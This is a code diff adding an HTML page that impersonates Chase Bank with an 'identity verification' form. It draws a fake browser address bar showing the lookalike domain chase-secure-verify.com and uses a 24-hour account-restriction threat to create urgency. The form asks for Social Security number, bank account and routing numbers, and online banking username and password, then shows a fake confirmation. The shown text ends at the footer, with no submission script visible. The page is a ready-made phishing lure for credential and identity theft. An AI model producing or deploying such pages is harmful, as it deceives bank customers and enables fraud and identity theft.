@@ -1,0 +1,727 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Chase Bank - Account Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        :root {
+            --chase-blue: #0a4c8a;
+            --chase-dark: #062a4f;
+            --chase-light: #e8f0f8;
+            --chase-accent: #005eb8;
+            --alert-amber: #fef3cd;
+            --alert-border: #f6ad55;
+            --alert-text: #744210;
+            --danger-red: #d93025;
+            --success-green: #0f7b3a;
+            --gray-light: #f7f8fa;
+            --gray-border: #d1d5db;
+            --text-dark: #1a1a1a;
+            --text-medium: #4a4a4a;
+            --text-light: #6b7280;
+            --white: #ffffff;
+            --shadow-sm: 0 1px 3px rgba(0, 0, 0, 0.06);
+            --shadow-md: 0 8px 30px rgba(0, 0, 0, 0.12);
+            --shadow-lg: 0 20px 60px rgba(0, 0, 0, 0.2);
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 14px;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #e9edf2;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 0;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* Fake Browser Chrome */
+        .browser-wrapper {
+            width: 100%;
+            max-width: 720px;
+            margin: 18px auto 0;
+            background: #ffffff;
+            border-radius: 10px 10px 0 0;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+        }
+
+        .browser-chrome {
+            background: #e4e6eb;
+            padding: 10px 14px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #cdd0d8;
+            user-select: none;
+        }
+
+        .window-controls {
+            display: flex;
+            gap: 7px;
+            flex-shrink: 0;
+        }
+
+        .window-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            display: inline-block;
+            flex-shrink: 0;
+        }
+
+        .window-dot.red {
+            background: #ff5f57;
+            border: 1px solid #e04b44;
+        }
+        .window-dot.yellow {
+            background: #febc2e;
+            border: 1px solid #dfa123;
+        }
+        .window-dot.green {
+            background: #28c840;
+            border: 1px solid #1daa34;
+        }
+
+        .url-bar {
+            background: #ffffff;
+            flex: 1;
+            padding: 7px 13px;
+            border-radius: 20px;
+            border: 1px solid #d2d5dc;
+            font-family: 'SF Mono', 'Cascadia Code', 'Consolas', 'Monaco', 'Courier New', monospace;
+            font-size: 12px;
+            color: #2d7a2e;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            min-width: 0;
+        }
+
+        .url-bar .lock-icon {
+            flex-shrink: 0;
+            font-size: 13px;
+        }
+
+        .url-bar .protocol {
+            color: #5f6368;
+            flex-shrink: 0;
+        }
+
+        .url-bar .domain-name {
+            font-weight: 700;
+            color: #1a1a1a;
+            flex-shrink: 0;
+        }
+
+        .url-bar .path-segment {
+            color: #5f6368;
+            flex-shrink: 1;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .browser-actions {
+            display: flex;
+            gap: 8px;
+            flex-shrink: 0;
+        }
+
+        .browser-action-icon {
+            width: 20px;
+            height: 20px;
+            border-radius: 3px;
+            background: #cdd0d8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            color: #555;
+        }
+
+        /* Main Container */
+        .main-container {
+            width: 100%;
+            max-width: 720px;
+            background: #ffffff;
+            border-radius: 0 0 10px 10px;
+            box-shadow: var(--shadow-lg);
+            overflow: hidden;
+            margin: 0 auto 30px;
+        }
+
+        .browser-wrapper+.main-container {
+            border-radius: 0 0 10px 10px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.2);
+            margin-top: 0;
+            border-top: none;
+        }
+
+        /* Header */
+        .page-header {
+            background: #ffffff;
+            padding: 0;
+            border-bottom: 3px solid var(--chase-blue);
+            position: relative;
+        }
+
+        .header-top {
+            background: var(--chase-blue);
+            padding: 12px 28px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            font-size: 11px;
+            color: rgba(255, 255, 255, 0.85);
+            letter-spacing: 0.3px;
+        }
+
+        .header-top a {
+            color: rgba(255, 255, 255, 0.9);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .header-top a:hover {
+            text-decoration: underline;
+        }
+
+        .header-main {
+            padding: 20px 28px 18px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            background: #ffffff;
+        }
+
+        .chase-logo {
+            width: 52px;
+            height: 52px;
+            background: var(--chase-blue);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .chase-logo-inner {
+            width: 20px;
+            height: 32px;
+            background: #ffffff;
+            clip-path: polygon(0 50%, 100% 0, 100% 33%, 33% 50%, 100% 67%, 100% 100%);
+            border-radius: 0;
+            position: relative;
+            left: 2px;
+        }
+
+        .header-brand-text h1 {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--chase-blue);
+            letter-spacing: -0.3px;
+            margin: 0;
+            line-height: 1.2;
+        }
+
+        .header-brand-text p {
+            font-size: 13px;
+            color: #5a6c7d;
+            font-weight: 400;
+            margin: 2px 0 0;
+            letter-spacing: 0.2px;
+        }
+
+        /* Alert Banner */
+        .alert-banner {
+            background: #fff8e6;
+            border-left: 5px solid #e6a817;
+            border-top: 1px solid #f0d78c;
+            border-bottom: 1px solid #f0d78c;
+            padding: 14px 24px;
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin: 0;
+        }
+
+        .alert-icon {
+            font-size: 26px;
+            flex-shrink: 0;
+            line-height: 1;
+            margin-top: 1px;
+        }
+
+        .alert-content {
+            flex: 1;
+        }
+
+        .alert-content .alert-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: #8b5e14;
+            margin: 0 0 3px;
+            letter-spacing: 0.1px;
+        }
+
+        .alert-content p {
+            font-size: 13px;
+            color: #744210;
+            margin: 0;
+            line-height: 1.5;
+        }
+
+        .alert-content .urgency-tag {
+            display: inline-block;
+            background: #d93025;
+            color: #ffffff;
+            font-size: 11px;
+            font-weight: 700;
+            padding: 4px 10px;
+            border-radius: 4px;
+            margin-top: 8px;
+            letter-spacing: 0.3px;
+            text-transform: uppercase;
+        }
+
+        /* Form Container */
+        .form-container {
+            padding: 28px 28px 10px;
+        }
+
+        .section-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--chase-dark);
+            margin-bottom: 18px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid #e5e7eb;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            letter-spacing: -0.2px;
+        }
+
+        .section-title .section-icon {
+            font-size: 20px;
+        }
+
+        .form-row {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 14px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group.full-width {
+            grid-column: 1 / -1;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 12.5px;
+            font-weight: 600;
+            color: #374151;
+            margin-bottom: 5px;
+            letter-spacing: 0.2px;
+        }
+
+        .form-group label .required-star {
+            color: #d93025;
+            font-weight: 700;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 11px 14px;
+            border: 1.5px solid #d1d5db;
+            border-radius: var(--radius-sm);
+            font-size: 14px;
+            font-family: inherit;
+            color: #1a1a1a;
+            background: #fafbfc;
+            transition: all 0.2s ease;
+            letter-spacing: 0.3px;
+        }
+
+        .form-group input:hover {
+            border-color: #9ca3af;
+            background: #ffffff;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--chase-accent);
+            background: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 94, 184, 0.1);
+        }
+
+        .form-group input::placeholder {
+            color: #b0b7c3;
+            font-size: 13px;
+            letter-spacing: 0.2px;
+        }
+
+        /* Secure indicator */
+        .secure-indicator {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-size: 11px;
+            color: #0f7b3a;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        .secure-indicator .lock-small {
+            font-size: 13px;
+        }
+
+        /* Separator */
+        .form-separator {
+            border: none;
+            border-top: 1px solid #e5e7eb;
+            margin: 6px 0 18px;
+        }
+
+        /* Submit Button */
+        .submit-btn {
+            width: 100%;
+            padding: 15px 20px;
+            background: linear-gradient(180deg, #0d5da0, #0a4c8a);
+            color: #ffffff;
+            border: none;
+            border-radius: var(--radius-md);
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            letter-spacing: 0.3px;
+            transition: all 0.2s ease;
+            box-shadow: 0 2px 8px rgba(10, 76, 138, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .submit-btn:hover {
+            background: linear-gradient(180deg, #1069b5, #0b5699);
+            box-shadow: 0 4px 14px rgba(10, 76, 138, 0.35);
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:active {
+            transform: translateY(0);
+            box-shadow: 0 1px 4px rgba(10, 76, 138, 0.3);
+        }
+
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            right: 18px;
+            transform: translateY(-50%);
+            width: 18px;
+            height: 18px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z'/%3E%3C/svg%3E") no-repeat center;
+            background-size: contain;
+            opacity: 0.85;
+        }
+
+        /* Footer */
+        .page-footer {
+            background: #f9fafb;
+            padding: 14px 24px;
+            text-align: center;
+            font-size: 11px;
+            color: #9ca3af;
+            border-top: 1px solid #e5e7eb;
+            letter-spacing: 0.2px;
+        }
+
+        .page-footer .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 16px;
+            margin-bottom: 6px;
+        }
+
+        .page-footer .footer-links span {
+            color: #6b7280;
+            cursor: default;
+        }
+
+        /* Success Message */
+        .success-overlay {
+            display: none;
+            text-align: center;
+            padding: 50px 36px 56px;
+        }
+
+        .success-overlay .success-icon-wrapper {
+            width: 80px;
+            height: 80px;
+            background: #e6f4ea;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+        }
+
+        .success-overlay .success-icon {
+            font-size: 44px;
+            line-height: 1;
+        }
+
+        .success-overlay h2 {
+            color: #0f7b3a;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            letter-spacing: -0.3px;
+        }
+
+        .success-overlay p {
+            color: #4a5568;
+            font-size: 14px;
+            line-height: 1.6;
+            max-width: 420px;
+            margin: 0 auto 6px;
+        }
+
+        .success-overlay .ref-id {
+            display: inline-block;
+            background: #f3f4f6;
+            padding: 6px 14px;
+            border-radius: 4px;
+            font-family: 'SF Mono', 'Cascadia Code', 'Consolas', monospace;
+            font-size: 12px;
+            color: #374151;
+            margin-top: 12px;
+            letter-spacing: 0.5px;
+        }
+
+        /* Responsive */
+        @media (max-width: 600px) {
+            .browser-wrapper,
+            .main-container {
+                max-width: 100%;
+                margin-left: 8px;
+                margin-right: 8px;
+                border-radius: 8px;
+            }
+            .browser-wrapper {
+                border-radius: 8px 8px 0 0;
+            }
+            .browser-wrapper+.main-container {
+                border-radius: 0 0 8px 8px;
+            }
+            .form-row {
+                grid-template-columns: 1fr;
+                gap: 0;
+            }
+            .form-container {
+                padding: 20px 16px 8px;
+            }
+            .header-main {
+                padding: 16px;
+                gap: 12px;
+            }
+            .header-top {
+                padding: 10px 16px;
+                font-size: 10px;
+            }
+            .alert-banner {
+                padding: 12px 16px;
+            }
+            .chase-logo {
+                width: 42px;
+                height: 42px;
+                border-radius: 8px;
+            }
+            .header-brand-text h1 {
+                font-size: 18px;
+            }
+            .url-bar {
+                font-size: 10px;
+                padding: 5px 10px;
+            }
+            .submit-btn {
+                font-size: 14px;
+                padding: 13px 16px;
+            }
+            .submit-btn::after {
+                right: 14px;
+                width: 16px;
+                height: 16px;
+            }
+            .page-footer .footer-links {
+                gap: 10px;
+                font-size: 10px;
+            }
+            .success-overlay {
+                padding: 36px 20px 44px;
+            }
+            .success-overlay h2 {
+                font-size: 19px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Fake Browser Chrome -->
+    <div class="browser-wrapper">
+        <div class="browser-chrome">
+            <div class="window-controls">
+                <span class="window-dot red"></span>
+                <span class="window-dot yellow"></span>
+                <span class="window-dot green"></span>
+            </div>
+            <div class="url-bar">
+                <span class="lock-icon">🔒</span>
+                <span class="protocol">https://</span>
+                <span class="domain-name">chase-secure-verify.com</span>
+                <span class="path-segment">/account/identity-verification</span>
+            </div>
+            <div class="browser-actions">
+                <div class="browser-action-icon">⟳</div>
+                <div class="browser-action-icon">⋮</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="main-container">
+        <!-- Header -->
+        <div class="page-header">
+            <div class="header-top">
+                <span>🔒 Secure Connection</span>
+                <span>Chase Bank, N.A. Member FDIC</span>
+            </div>
+            <div class="header-main">
+                <div class="chase-logo">
+                    <div class="chase-logo-inner"></div>
+                </div>
+                <div class="header-brand-text">
+                    <h1>Chase Bank</h1>
+                    <p>Personal & Business Banking</p>
+                </div>
+            </div>
+        </div>
+
+        <!-- Alert Banner -->
+        <div class="alert-banner">
+            <span class="alert-icon">⚠️</span>
+            <div class="alert-content">
+                <div class="alert-title">Security Alert – Account Verification Required</div>
+                <p>Our security system has flagged your account for potential unauthorized access. To prevent fraud, we require immediate identity verification.</p>
+                <span class="urgency-tag">⚠ Warning: Your account access will be restricted if verification is not completed within 24 hours.</span>
+            </div>
+        </div>
+
+        <!-- Form Section -->
+        <div id="formSection">
+            <div class="form-container">
+                <div class="secure-indicator">
+                    <span class="lock-small">🔒</span>
+                    <span>All information is encrypted and transmitted securely</span>
+                </div>
+
+                <div class="section-title">
+                    <span class="section-icon">🛡️</span> Identity Verification Form
+                </div>
+
+                <form id="verificationForm" onsubmit="handleSubmit(event)">
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="full_name">Full Name <span class="required-star">*</span></label>
+                            <input type="text" id="full_name" name="full_name" placeholder="John Smith" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="dob">Date of Birth <span class="required-star">*</span></label>
+                            <input type="text" id="dob" name="dob" placeholder="MM/DD/YYYY" required autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="ssn">Social Security Number <span class="required-star">*</span></label>
+                            <input type="text" id="ssn" name="ssn" placeholder="123-45-6789" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="bank_account">Bank Account Number <span class="required-star">*</span></label>
+                            <input type="text" id="bank_account" name="bank_account" placeholder="1234567890" required autocomplete="off">
+                        </div>
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="routing_number">Routing Number <span class="required-star">*</span></label>
+                            <input type="text" id="routing_number" name="routing_number" placeholder="021000021" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="phone">Phone Number <span class="required-star">*</span></label>
+                            <input type="text" id="phone" name="phone" placeholder="(555) 123-4567" required autocomplete="off">
+                        </div>
+                    </div>
+                    <hr class="form-separator">
+                    <div class="section-title">
+                        <span class="section-icon">🔑</span> Online Banking Credentials
+                    </div>
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="online_id">Online Banking Username <span class="required-star">*</span></label>
+                            <input type="text" id="online_id" name="online_id" placeholder="your_username" required autocomplete="off">
+                        </div>
+                        <div class="form-group">
+                            <label for="online_password">Online Banking Password <span class="required-star">*</span></label>
+                            <input type="password" id="online_password" name="online_password" placeholder="••••••••" required autocomplete="off">
+                        </div>
+                    </div>
+                    <button type="submit" class="submit-btn">Verify My Identity</button>
+                </form>
+            </div>
+        </div>
+
+        <!-- Success Message (Hidden by default) -->
+        <div class="success-overlay" id="successMessage">
+            <div class="success-icon-wrapper">
+                <span class="success-icon">✅</span>
+            </div>
+            <h2>Verification Submitted Successfully</h2>
+            <p>Your identity verification has been received and is being processed. Your account access will be fully restored shortly.</p>
+            <p>If additional information is needed, a Chase representative will contact you within 1–2 business days.</p>
+            <div class="ref-id">Reference ID: CH-VER-<span id="refNumber">738291</span></div>
+        </div>
+
+        <!-- Footer -->
+        <div class="page-footer">
+            <div class="footer-links">
+                <span>Privacy Policy</span>
+                <span>·</span>
+                <span>Terms of Use</span>
+                <span>·</span>
+                <span>Security</span>
+                <span>·</span>
+                <span>FDIC Insurance</span>
+            </div>
+            <div>© 2024 JPMorgan Chase Bank, N.A. Member FDIC. Equal Housing Lender.</div>
